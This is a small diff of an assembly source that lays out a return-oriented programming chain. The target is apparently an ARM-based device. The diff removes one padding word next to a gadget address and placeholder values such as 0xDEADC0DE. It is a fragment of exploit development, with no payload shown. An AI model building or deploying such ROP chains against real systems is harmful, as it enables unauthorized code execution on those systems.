@@ -10,8 +10,6 @@
 	;actual ROP start
 	; .word 0x0010322c ; inf loop
 
-	.word 0xDEAD0000
-
 	;write thread0 initial rop
 		.word 0x00101e34 ; pop	{r4, r5, r6, r7, r8, pc}
 			.word 0xDEADC0DE
